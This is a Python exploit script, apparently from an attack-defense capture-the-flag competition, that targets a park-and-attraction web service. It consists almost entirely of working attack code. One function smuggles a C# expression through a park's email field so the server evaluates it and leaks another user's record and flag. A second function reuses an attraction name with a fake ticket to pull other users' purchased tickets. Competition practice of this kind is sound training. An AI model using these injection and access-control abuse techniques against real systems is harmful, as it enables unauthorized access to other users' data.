from client import Client
from data import get_random_creds, get_park_request, get_random_document
from models import RegisterRequest, AddAttractionRequest
from pretty_client import PrettyClient


def generate_email_payload(user_id):
    parts = ",".join([f"(char){ord(x)}" for x in user_id])
    guid_payload = f"Guid.Parse(new[]{{{parts}}})"
    return f"\"hacked-by-voidhack\"@userProvider.GetUser({guid_payload})"


def first_sploit(hostname, user_id):
    native_client = Client(hostname, 7777)
    client = PrettyClient(native_client)

    login, password = get_random_creds()
    register_request = RegisterRequest(login=login, password=password, document=get_random_document())
    client.register_and_login(register_request)

    create_park_request = get_park_request(False)
    create_park_request.email = generate_email_payload(user_id)
    park_id = client.create_park(create_park_request)

    r = native_client.get_park(park_id).text
    flag_index = r.index("CTF{")
    flag = r[flag_index:]
    flag = flag[:flag.index("}")+1]
    return flag


def second_sploit(hostname, park_id, attraction_id):
    client = PrettyClient(Client(hostname, 7777))

    login, password = get_random_creds()
    register_request = RegisterRequest(login=login, password=password, document=get_random_document())
    user_id = client.register_and_login(register_request)

    parks = client.get_last_parks()
    park = [x for x in parks.parks if x.id == park_id][0]
    attraction_name = [x for x in park.attractions if x.id == attraction_id][0].name

    created_park_id = client.create_park(get_park_request(False))
    add_attraction_request = AddAttractionRequest(name=attraction_name, description="1", cost=1, ticket="faked_ticket")
    added_attraction = client.add_attraction(created_park_id, add_attraction_request)

    user = client.buy_ticket(added_attraction.id, user_id)
    flags = [x for x in user.purchasesInfo.purchases if x.name == attraction_name and x.ticket != "faked_ticket"]
    return flags


def main():
    print(first_sploit("localhost", "ef3d89a5-37ab-4403-a9ef-9dfa36a5c83b"))
    # print(second_sploit("localhost", "d58ad940-831f-43af-977f-cc673580514c", "b8e7253c-8310-4711-b057-345defa85b5b"))


if __name__ == "__main__":
    main()
